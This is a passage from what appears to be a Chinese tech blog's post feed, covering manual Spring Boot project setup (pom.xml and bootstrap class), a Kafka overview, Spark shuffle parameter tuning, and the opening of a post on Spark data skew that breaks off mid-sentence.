title="注意事项"></a>注意事项</h4><ul><li>阿里云提供的坐标版本较低，如果需要使用高版本，进入工程后手工切换SpringBoot版本</li><li>阿里云提供的工程模板与Spring官网提供的工程模板略有不同</li></ul><h3 id="手工创建Maven工程修改为SpringBoot工程"><a href="#手工创建Maven工程修改为SpringBoot工程" class="headerlink" title="手工创建Maven工程修改为SpringBoot工程"></a>手工创建Maven工程修改为SpringBoot工程</h3><ul><li>创建普通Maven工程</li><li>继承spring-boot-starter-parent</li><li>添加依赖spring-boot-starter-web</li><li>制作引导类Application</li></ul><h4 id="手工创建项目（手工导入坐标）"><a href="#手工创建项目（手工导入坐标）" class="headerlink" title="手工创建项目（手工导入坐标）"></a>手工创建项目（手工导入坐标）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aiyingke<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>17<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="手工创建项目（手工制作引导类）"><a href="#手工创建项目（手工制作引导类）" class="headerlink" title="手工创建项目（手工制作引导类）"></a>手工创建项目（手工制作引导类）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringbootBaseCreateMethod01Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SpringbootBaseCreateMethod01Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kafka 概述</title>
      <link href="/blog/daa0264.html/"/>
      <url>/blog/daa0264.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：定义"><a href="#一：定义" class="headerlink" title="一：定义"></a>一：定义</h1><p>Kafka 传统定义：Kafka 是一个分布式的基于发布&#x2F;订阅模式的消息队列，主要应用于大数据的实时处理场景。<br>发布&#x2F;订阅：消息的发布者不会将消息直接发送给消息的订阅者，而是将发送的消息分为不同的类别，订阅者只接受感兴趣的消息。<br>Kafka 愿景定义：Kafka 是一个开源的分布式事件流平台，被多数公司用于高性能数据管道、流分析、数据集成和关键任务应用。</p><h1 id="二：消息队列"><a href="#二：消息队列" class="headerlink" title="二：消息队列"></a>二：消息队列</h1><p>在大数据领域通常采用 Kafka 作为消息队列。</p><h2 id="2-1-传统消息队列的应用场景"><a href="#2-1-传统消息队列的应用场景" class="headerlink" title="2.1 传统消息队列的应用场景"></a>2.1 传统消息队列的应用场景</h2><p>传统的消息队列主要应用于：缓存&#x2F;消峰、解耦和异步通信。</p><h3 id="缓存-x2F-消峰："><a href="#缓存-x2F-消峰：" class="headerlink" title="缓存&#x2F;消峰："></a>缓存&#x2F;消峰：</h3><p>有助于控制和优化数据流系统的速度，解决生产消息和消费消息的处理速度不一致的情况。</p><p><img src="/blog/daa0264.html/image-20230404080211198.png" alt="image.png"></p><h3 id="解耦："><a href="#解耦：" class="headerlink" title="解耦："></a>解耦：</h3><p>允许独立的扩展或者修改两边的处理过程，只要确保他们遵循同样的数据接口约束。</p><p><img src="/blog/daa0264.html/image-20230404080231754.png" alt="image.png"></p><h3 id="异步通信："><a href="#异步通信：" class="headerlink" title="异步通信："></a>异步通信：</h3><p>允许用户把消息放入队列中，但不立即处理它，然后在需要的时候再处理它们。</p><p><img src="/blog/daa0264.html/image-20230404080240773.png" alt="image.png"></p><h2 id="2-2-消息队列的两种模式"><a href="#2-2-消息队列的两种模式" class="headerlink" title="2.2 消息队列的两种模式"></a>2.2 消息队列的两种模式</h2><h3 id="点对点模式："><a href="#点对点模式：" class="headerlink" title="点对点模式："></a>点对点模式：</h3><p>消费者主动拉去消息，收到消息后清除消息。</p><p><img src="/blog/daa0264.html/image-20230404080249793.png" alt="image.png"></p><h3 id="发布-x2F-订阅模式："><a href="#发布-x2F-订阅模式：" class="headerlink" title="发布&#x2F;订阅模式："></a>发布&#x2F;订阅模式：</h3><ul><li>可以有多个topic主题；</li><li>消费者消费数据后，不删除数据；</li><li>每个消费者相互独立，都可以消费到数据。</li></ul><p><img src="/blog/daa0264.html/image-20230404080303157.png"></p><h1 id="三：Kafka-基础架构"><a href="#三：Kafka-基础架构" class="headerlink" title="三：Kafka 基础架构"></a>三：Kafka 基础架构</h1><p><img src="/blog/daa0264.html/image-20230404080309991.png" alt="image-20230404080309991"><br>（1）Producer：消息生产者，向 Kafka broker 发消息的客户端。<br>（2）Consumer：消息消费者，向 Kafka broker 取消息的客户端。<br>（3）Consumer Group（CG）：消费者组，由多个 consumer 组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费；消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。<br>（4）Broker：一台 Kafka 服务器就是一个 broker。一个集群由多个 broker 组成。一个 broker 可以容纳多个 topic。<br>（5）Topic：可以理解为一个队列，生产者和消费者面向的都是一个topic。<br>（6）Partition：为了实现扩展性，一个非常大的 topic 可以分布到多个 broker （服务器）上，一个 topic 可以分为多个 partition，每个 parition 是一个有序的队列。<br>（7）Replica：副本。一个 topic 的每个分区都有若干个副本，一个 Leader 和若干个 Follower。<br>（8）Leader：每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是 Leader。<br>（9)Follower：每个分区多个副本中的“从”，实时从 Leader 中同步数据，保持和 Leader 数据同步。Leader 发生故障时，某一个 Follower 会成为新的 Leader。</p>]]></content>
      
      
      <categories>
          
          <category> Kafka </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 性能调优——Shuffle调优</title>
      <link href="/blog/60787c8.html/"/>
      <url>/blog/60787c8.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：ShuffleManager发展概述"><a href="#一：ShuffleManager发展概述" class="headerlink" title="一：ShuffleManager发展概述"></a>一：ShuffleManager发展概述</h1><p>在Spark的源码中，<strong>负责shuffle过程的执行、计算和处理的组件</strong>主要就是<strong>ShuffleManager</strong>，也即<strong>shuffle管理器</strong>。而随着Spark的版本的发展，ShuffleManager也在不断迭代，变得越来越先进。</p><p>在Spark 1.2以前，默认的shuffle计算引擎是HashShuffleManager。该ShuffleManager而HashShuffleManager有着一个非常严重的弊端，就是会<strong>产生大量的中间磁盘文件，进而由大量的磁盘IO操作影响了性能</strong>。</p><p>因此在Spark 1.2以后的版本中，默认的ShuffleManager改成了<strong>SortShuffleManager</strong>。SortShuffleManager相较于HashShuffleManager来说，有了一定的改进。主要就在于，每个Task在进行shuffle操作时，虽然也会产生较多的临时磁盘文件，但是最后会将所有的临时文件合并（merge）成一个磁盘文件，因此每个Task就只有一个磁盘文件。在下一个stage的shuffle read task拉取自己的数据时，只要根据索引读取每个磁盘文件中的部分数据即可。</p><p>下面我们详细分析一下HashShuffleManager和SortShuffleManager的原理。</p><h1 id="二：HashShuffleManager运行原理"><a href="#二：HashShuffleManager运行原理" class="headerlink" title="二：HashShuffleManager运行原理"></a>二：HashShuffleManager运行原理</h1><h2 id="2-1-未经优化的HashShuffleManager"><a href="#2-1-未经优化的HashShuffleManager" class="headerlink" title="2.1 未经优化的HashShuffleManager"></a>2.1 未经优化的HashShuffleManager</h2><p>下图说明了未经优化的HashShuffleManager的原理。这里我们先明确一个假设前提：每个Executor只有1个CPU core，也就是说，无论这个Executor上分配多少个task线程，同一时间都只能执行一个task线程。</p><p>我们先从shuffle write开始说起。shuffle write阶段，主要就是在一个stage结束计算之后，为了下一个stage可以执行shuffle类的算子（比如reduceByKey），而将每个task处理的数据按key进行“分类”。所谓“分类”，就是对相同的key执行hash算法，从而将相同key都写入同一个磁盘文件中，而每一个磁盘文件都只属于下游stage的一个task。在将数据写入磁盘之前，会先将数据写入内存缓冲中，当内存缓冲填满之后，才会溢写到磁盘文件中去。</p><p>那么每个执行shuffle write的task，要为下一个stage创建多少个磁盘文件呢？很简单，下一个stage的task有多少个，当前stage的每个task就要创建多少份磁盘文件。比如下一个stage总共有100个task，那么当前stage的每个task都要创建100份磁盘文件。如果当前stage有50个task，总共有10个Executor，每个Executor执行5个Task，那么每个Executor上总共就要创建500个磁盘文件，所有Executor上会创建5000个磁盘文件。由此可见，未经优化的shuffle write操作所产生的磁盘文件的数量是极其惊人的。</p><p>接着我们来说说shuffle read。shuffle read，通常就是一个stage刚开始时要做的事情。此时该stage的每一个task就需要将上一个stage的计算结果中的所有相同key，从各个节点上通过网络都拉取到自己所在的节点上，然后进行key的聚合或连接等操作。由于shuffle write的过程中，task给下游stage的每个task都创建了一个磁盘文件，因此shuffle read的过程中，每个task只要从上游stage的所有task所在节点上，拉取属于自己的那一个磁盘文件即可。</p><p>shuffle read的拉取过程是一边拉取一边进行聚合的。每个shuffle read task都会有一个自己的buffer缓冲，每次都只能拉取与buffer缓冲相同大小的数据，然后通过内存中的一个Map进行聚合等操作。聚合完一批数据后，再拉取下一批数据，并放到buffer缓冲中进行聚合操作。以此类推，直到最后将所有数据到拉取完，并得到最终的结果。</p><p><img src="/blog/60787c8.html/1648882910142-f0b6c560-beac-475f-ae4c-669711da3b4b.png" alt="img"></p><h2 id="2-2-优化后的HashShuffleManager"><a href="#2-2-优化后的HashShuffleManager" class="headerlink" title="2.2 优化后的HashShuffleManager"></a>2.2 优化后的HashShuffleManager</h2><p>下图说明了优化后的HashShuffleManager的原理。</p><p><img src="/blog/60787c8.html/1648883523295-7bee2767-fd92-412e-94eb-c80712518570.png" alt="img"></p><p>这里说的优化，是指我们可以设置一个参数，spark.shuffle.consolidateFiles。该参数默认值为false，将其设置为true即可开启优化机制。通常来说，如果我们使用HashShuffleManager，那么都建议开启这个选项。</p><p>开启consolidate机制之后，在shuffle write过程中，task就不是为下游stage的每个task创建一个磁盘文件了。此时会出现shuffleFileGroup的概念，每个shuffleFileGroup会对应一批磁盘文件，磁盘文件的数量与下游stage的task数量是相同的。一个Executor上有多少个CPU core，就可以并行执行多少个task。而第一批并行执行的每个task都会创建一个shuffleFileGroup，并将数据写入对应的磁盘文件内。</p><p>当Executor的CPU core执行完一批task，接着执行下一批task时，下一批task就会复用之前已有的shuffleFileGroup，包括其中的磁盘文件。也就是说，此时task会将数据写入已有的磁盘文件中，而不会写入新的磁盘文件中。因此，consolidate机制允许不同的task复用同一批磁盘文件，这样就可以有效将多个task的磁盘文件进行一定程度上的合并，从而大幅度减少磁盘文件的数量，进而提升shuffle write的性能。</p><p>假设第二个stage有100个task，第一个stage有50个task，总共还是有10个Executor，每个Executor执行5个task。那么原本使用未经优化的HashShuffleManager时，每个Executor会产生500个磁盘文件，所有Executor会产生5000个磁盘文件的。但是此时经过优化之后，每个Executor创建的磁盘文件的数量的计算公式为：CPU core的数量 * 下一个stage的task数量。也就是说，每个Executor此时只会创建100个磁盘文件，所有Executor只会创建1000个磁盘文件。</p><h2 id="2-3-普通运行机制"><a href="#2-3-普通运行机制" class="headerlink" title="2.3 普通运行机制"></a>2.3 普通运行机制</h2><p>下图说明了普通的SortShuffleManager的原理。在该模式下，数据会先写入一个内存数据结构中，此时根据不同的shuffle算子，可能选用不同的数据结构。如果是reduceByKey这种聚合类的shuffle算子，那么会选用Map数据结构，一边通过Map进行聚合，一边写入内存；如果是join这种普通的shuffle算子，那么会选用Array数据结构，直接写入内存。接着，每写一条数据进入内存数据结构之后，就会判断一下，是否达到了某个临界阈值。如果达到临界阈值的话，那么就会尝试将内存数据结构中的数据溢写到磁盘，然后清空内存数据结构。</p><p>在溢写到磁盘文件之前，会先根据key对内存数据结构中已有的数据进行排序。排序过后，会分批将数据写入磁盘文件。默认的batch数量是10000条，也就是说，排序好的数据，会以每批1万条数据的形式分批写入磁盘文件。写入磁盘文件是通过Java的BufferedOutputStream实现的。BufferedOutputStream是Java的缓冲输出流，首先会将数据缓冲在内存中，当内存缓冲满溢之后再一次写入磁盘文件中，这样可以减少磁盘IO次数，提升性能。</p><p>一个task将所有数据写入内存数据结构的过程中，会发生多次磁盘溢写操作，也就会产生多个临时文件。最后会将之前所有的临时磁盘文件都进行合并，这就是merge过程，此时会将之前所有临时磁盘文件中的数据读取出来，然后依次写入最终的磁盘文件之中。此外，由于一个task就只对应一个磁盘文件，也就意味着该task为下游stage的task准备的数据都在这一个文件中，因此还会单独写一份索引文件，其中标识了下游各个task的数据在文件中的start offset与end offset。</p><p>SortShuffleManager由于有一个磁盘文件merge的过程，因此大大减少了文件数量。比如第一个stage有50个task，总共有10个Executor，每个Executor执行5个task，而第二个stage有100个task。由于每个task最终只有一个磁盘文件，因此此时每个Executor上只有5个磁盘文件，所有Executor只有50个磁盘文件。</p><p><img src="/blog/60787c8.html/1648884121250-0f0397cf-5c7d-4a6e-8249-453ba11b395b.png" alt="img"></p><h2 id="2-4-bypass运行机制"><a href="#2-4-bypass运行机制" class="headerlink" title="2.4 bypass运行机制"></a>2.4 bypass运行机制</h2><p>下图说明了bypass SortShuffleManager的原理。bypass运行机制的触发条件如下：</p><p> * shuffle map task数量小于spark.shuffle.sort.bypassMergeThreshold参数的值。 </p><p>* 不是聚合类的shuffle算子（比如reduceByKey）。</p><p>此时task会为每个下游task都创建一个临时磁盘文件，并将数据按key进行hash然后根据key的hash值，将key写入对应的磁盘文件之中。当然，写入磁盘文件时也是先写入内存缓冲，缓冲写满之后再溢写到磁盘文件的。最后，同样会将所有临时磁盘文件都合并成一个磁盘文件，并创建一个单独的索引文件。</p><p>该过程的磁盘写机制其实跟未经优化的HashShuffleManager是一模一样的，因为都要创建数量惊人的磁盘文件，只是在最后会做一个磁盘文件的合并而已。因此少量的最终磁盘文件，也让该机制相对未经优化的HashShuffleManager来说，shuffle read的性能会更好。</p><p>而该机制与普通SortShuffleManager运行机制的不同在于：第一，磁盘写机制不同；第二，不会进行排序。也就是说，<strong>启用该机制的最大好处在于，shuffle write过程中，不需要进行数据的排序操作，也就节省掉了这部分的性能开销。</strong></p><p><img src="/blog/60787c8.html/1648884245925-5db22e38-be48-42a6-8668-3dbdac9cbf1c.png" alt="img"></p><h1 id="三：shuffle相关参数调优"><a href="#三：shuffle相关参数调优" class="headerlink" title="三：shuffle相关参数调优"></a>三：shuffle相关参数调优</h1><p>以下是Shffule过程中的一些主要参数，这里详细讲解了各个参数的功能、默认值以及基于实践经验给出的调优建议。</p><h2 id="spark-shuffle-file-buffer"><a href="#spark-shuffle-file-buffer" class="headerlink" title="spark.shuffle.file.buffer"></a>spark.shuffle.file.buffer</h2><ul><li>默认值：32k</li><li>参数说明：该参数用于设置shuffle write task的BufferedOutputStream的buffer缓冲大小。将数据写到磁盘文件之前，会<strong>先写入buffer缓冲中，待缓冲写满之后，才会溢写到磁盘</strong>。</li><li>调优建议：如果作业可用的内存资源较为充足的话，可以适当增加这个参数的大小（比如64k），从而减少shuffle write过程中溢写磁盘文件的次数，也就可以减少磁盘IO次数，进而提升性能。在实践中发现，合理调节该参数，性能会有1%~5%的提升。</li></ul><h2 id="spark-reducer-maxSizeInFlight"><a href="#spark-reducer-maxSizeInFlight" class="headerlink" title="spark.reducer.maxSizeInFlight"></a>spark.reducer.maxSizeInFlight</h2><ul><li>默认值：48m</li><li>参数说明：该参数用于设置shuffle read task的buffer缓冲大小，而这个buffer缓冲决定了<strong>每次能够拉取多少数据</strong>。</li><li>调优建议：如果作业可用的内存资源较为充足的话，可以适当增加这个参数的大小（比如96m），从而减少拉取数据的次数，也就可以减少网络传输的次数，进而提升性能。在实践中发现，合理调节该参数，性能会有1%~5%的提升。</li></ul><h2 id="spark-shuffle-io-maxRetries"><a href="#spark-shuffle-io-maxRetries" class="headerlink" title="spark.shuffle.io.maxRetries"></a>spark.shuffle.io.maxRetries</h2><ul><li>默认值：3</li><li>参数说明：shuffle read task从shuffle write task所在节点<strong>拉取属于自己的数据</strong>时，如果因为网络异常导致拉取失败，是会自动进行重试的。该参数就代表了<strong>可以重试的最大次数</strong>。如果在指定次数之内拉取还是没有成功，就可能会导致作业执行失败。</li><li>调优建议：对于那些包含了特别耗时的shuffle操作的作业，建议增加重试最大次数（比如60次），以避免由于JVM的full gc或者网络不稳定等因素导致的数据拉取失败。在实践中发现，对于针对超大数据量（数十亿~上百亿）的shuffle过程，调节该参数可以大幅度提升稳定性。</li></ul><h2 id="spark-shuffle-io-retryWait"><a href="#spark-shuffle-io-retryWait" class="headerlink" title="spark.shuffle.io.retryWait"></a>spark.shuffle.io.retryWait</h2><ul><li>默认值：5s</li><li>参数说明：具体解释同上，该参数代表了每次重试拉取数据的等待间隔，默认是5s。</li><li>调优建议：建议<strong>加大间隔时长</strong>（比如60s），以<strong>增加shuffle操作的稳定性</strong>。</li></ul><h2 id="spark-shuffle-memoryFraction"><a href="#spark-shuffle-memoryFraction" class="headerlink" title="spark.shuffle.memoryFraction"></a>spark.shuffle.memoryFraction</h2><ul><li>默认值：0.2</li><li>参数说明：该参数代表了Executor内存中，分配给shuffle read task进行聚合操作的内存比例，默认是20%。</li><li>调优建议：在资源参数调优中讲解过这个参数。如果内存充足，而且很<strong>少使用持久化操作，建议调高这个比例</strong>，给shuffle read的聚合操作更多内存，以避免由于内存不足导致聚合过程中频繁读写磁盘。在实践中发现，合理调节该参数可以将性能提升10%左右。</li></ul><h2 id="spark-shuffle-manager"><a href="#spark-shuffle-manager" class="headerlink" title="spark.shuffle.manager"></a>spark.shuffle.manager</h2><ul><li>默认值：sort</li><li>参数说明：该参数用于设置ShuffleManager的类型。Spark 1.5以后，有三个可选项：hash、sort和tungsten-sort。HashShuffleManager是Spark 1.2以前的默认选项，但是Spark 1.2以及之后的版本默认都是SortShuffleManager了。tungsten-sort与sort类似，但是使用了tungsten计划中的堆外内存管理机制，内存使用效率更高。</li><li>调优建议：由于SortShuffleManager默认会对数据进行排序，因此如果你的业务逻辑中<strong>需要该排序机制的话，则使用默认的SortShuffleManager就可以</strong>；而如果你的业务逻辑不需要对数据进行排序，那么建议参考后面的几个参数调优，通过bypass机制或优化的HashShuffleManager来避免排序操作，同时提供较好的磁盘读写性能。这里要注意的是，tungsten-sort要慎用，因为之前发现了一些相应的bug。</li></ul><h2 id="spark-shuffle-sort-bypassMergeThreshold"><a href="#spark-shuffle-sort-bypassMergeThreshold" class="headerlink" title="spark.shuffle.sort.bypassMergeThreshold"></a>spark.shuffle.sort.bypassMergeThreshold</h2><ul><li>默认值：200</li><li>参数说明：当ShuffleManager为SortShuffleManager时，如果shuffle read task的数量小于这个阈值（默认是200），则shuffle write过程中不会进行排序操作，而是直接按照未经优化的HashShuffleManager的方式去写数据，但是最后会将每个task产生的所有临时磁盘文件都合并成一个文件，并会创建单独的索引文件。</li><li>调优建议：当你使用SortShuffleManager时，如果的确不需要排序操作，那么建议将这个参数调大一些，大于shuffle read task的数量。那么此时就会自动启用bypass机制，map-side就不会进行排序了，减少了排序的性能开销。但是这种方式下，依然会产生大量的磁盘文件，因此shuffle write性能有待提高。</li></ul><h2 id="spark-shuffle-consolidateFiles"><a href="#spark-shuffle-consolidateFiles" class="headerlink" title="spark.shuffle.consolidateFiles"></a>spark.shuffle.consolidateFiles</h2><ul><li>默认值：false</li><li>参数说明：如果使用HashShuffleManager，该参数有效。如果设置为true，那么就会开启consolidate机制，会大幅度合并shuffle write的输出文件，对于shuffle read task数量特别多的情况下，这种方法可以极大地减少磁盘IO开销，提升性能。</li><li>调优建议：如果的确不需要SortShuffleManager的排序机制，那么除了使用bypass机制，还可以尝试将spark.shffle.manager参数手动指定为hash，使用HashShuffleManager，同时开启consolidate机制。在实践中尝试过，发现其性能比开启了bypass机制的SortShuffleManager要高出10%~30%。</li></ul><h2 id="spark-shuffle-consolidateFiles-1"><a href="#spark-shuffle-consolidateFiles-1" class="headerlink" title="spark.shuffle.consolidateFiles"></a>spark.shuffle.consolidateFiles</h2><ul><li>默认值：false</li><li>参数说明：如果使用HashShuffleManager，该参数有效。如果设置为true，那么就会开启consolidate机制，会大幅度合并shuffle write的输出文件，对于shuffle read task数量特别多的情况下，这种方法可以极大地减少磁盘IO开销，提升性能。</li><li>调优建议：如果的确不需要SortShuffleManager的排序机制，那么除了使用bypass机制，还可以尝试将spark.shffle.manager参数手动指定为hash，使用HashShuffleManager，同时开启consolidate机制。在实践中尝试过，发现其性能比开启了bypass机制的SortShuffleManager要高出10%~30%。</li></ul><p>开发过程中的优化原则、运行前的资源参数设置调优、运行中的数据倾斜的解决方案、为了精益求精的shuffle调优。</p>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 性能调优——数据倾斜调优</title>
      <link href="/blog/ed3d1f39.html/"/>
      <url>/blog/ed3d1f39.html/</url>
      
        <content type="html"><![CDATA[<p>数据倾斜调优，就是使用各种技术方案解决不同类型的数据倾斜问题，以保证Spark作业的性能。</p><h1 id="一：数据倾斜发生时的现象"><a href="#一：数据倾斜发生时的现象" class="headerlink" title="一：数据倾斜发生时的现象"></a>一：数据倾斜发生时的现象</h1><ul><li>绝大多数task执行得都非常快，但个别task执行极慢。比如，<strong>总共有1000个task，997个task都在1分钟之内执行完了，但是剩余两三个task却要一两个小时</strong>。这种情况很常见。</li><li>原本能够正常执行的Spark作业，某天突然报出OOM（内存溢出）异常，观察异常栈，是我们写的业务代码造成的。这种情况比较少见。</li></ul><p><img src="/blog/ed3d1f39.html/1648867372204-756cdbdf-1f58-4759-a93b-74b7ea248566.png" alt="img"></p><h1 id="二：数据倾斜发生的原理"><a href="#二：数据倾斜发生的原理" class="headerlink" title="二：数据倾斜发生的原理"></a>二：数据倾斜发生的原理</h1><p>数据倾斜的原理很简单：在<strong>进行shuffle的时候，必须将各个节点上相同的key拉取到某个节点上的一个task来进行处理</strong>，比如<strong>按照key进行聚合或join等操作</strong>。此时如果某个key对应的数据量特别大的话，就会发生数据倾斜。比如大部分key对应10条数据，但是个别key却对应了100万条数据，那么大部分task可能就只会分配到10条数据，然后1秒钟就运行完了；但是<strong>个别task可能分配到了100万数据(巨量数据)<strong>，要运行一两个小时。因此，整个</strong>Spark作业的运行进度是由运行时间最长的那个task决定的</strong>。</p><p>因此出现数据倾斜的时候，Spark作业看起来会运行得非常缓慢，甚至可能因为某个task处理的数据量过大导致内存溢出。</p><h1 id="三：实例-数据倾斜"><a href="#三：实例-数据倾斜" class="headerlink" title="三：实例 数据倾斜"></a>三：实例 数据倾斜</h1><p>下图就是一个很清晰的例子：hello这个key，在三个节点上对应了总共7条数据，这些数据都会被拉取到同一个task中进行处理；而world和you这两个key分别才对应1条数据，所以另外两个task只要分别处理1条数据即可。此时第一个task的运行时间可能是另外两个task的7倍，而整个stage的运行速度也由运行最慢的那个task所决定。</p><p><img src="/blog/ed3d1f39.html/1648867732857-4e4706a4-2f59-4470-a4a8-3fb9fdfd00d2.png" alt="img"></p><h1 id="四：如何定位导致数据倾斜的代码"><a href="#四：如何定位导致数据倾斜的代码" class="headerlink" title="四：如何定位导致数据倾斜的代码"></a>四：如何定位导致数据倾斜的代码</h1><p><strong>数据倾斜只会发生在shuffle过程中</strong>。这里给大家罗列一些常用的并且可能<strong>会触发shuffle操作的算子：distinct、groupByKey、reduceByKey、aggregateByKey、join、cogroup、repartition</strong>等。出现数据倾斜时，可能就是你的代码中使用了这些算子中的某一个所导致的。</p><h2 id="4-1-某个task执行特别慢的情况"><a href="#4-1-某个task执行特别慢的情况" class="headerlink" title="4.1 某个task执行特别慢的情况"></a>4.1 某个task执行特别慢的情况</h2><p>首先要看的，就是数据倾斜发生在第几个stage中。</p><p>如果是用yarn-client模式提交，那么本地是直接可以看到log的，可以在log中找到当前运行到了第几个stage；如果是用yarn-cluster模式提交，则可以通过Spark Web UI来查看当前运行到了第几个stage。此外，无论是使用yarn-client模式还是yarn-cluster模式，我们都可以<strong>在Spark Web UI上深入看一下当前这个stage各个task分配的数据量</strong>，从而进一步<strong>确定是不是task分配的数据不均匀导致了数据倾斜</strong>。</p><p>比如下图中，倒数第三列显示了每个task的运行时间。明显可以看到，有的task运行特别快，只需要几秒钟就可以运行完；而有的task运行特别慢，需要几分钟才能运行完，此时单从运行时间上看就已经能够确定发生数据倾斜了。此外，倒数第一列显示了每个task处理的数据量，明显可以看到，运行时间特别短的task只需要处理几百KB的数据即可，而<strong>运行时间特别长的task需要处理几千KB的数据</strong>，<strong>处理的数据量差了10倍</strong>。此时更加能够确定是发生了数据倾斜。</p><p><img src="/blog/ed3d1f39.html/1648870600764-44baba48-3bd0-4f0e-9c4c-06c289041072.png" alt="img"></p><p>知道<strong>数据倾斜发生在哪一个stage之后</strong>，接着我们就需要根据stage划分原理，<strong>推算出来发生倾斜的那个stage对应代码中的哪一部分</strong>，这部分代码中肯定会有一个<strong>shuffle类算子</strong>。精准推算stage与代码的对应关系，需要对Spark的源码有深入的理解，这里我们可以介绍一个相对简单实用的推算方法：只要看到Spark代码中出现了一个shuffle类算子或者是Spark SQL的SQL语句中出现了会导致shuffle的语句（比如group 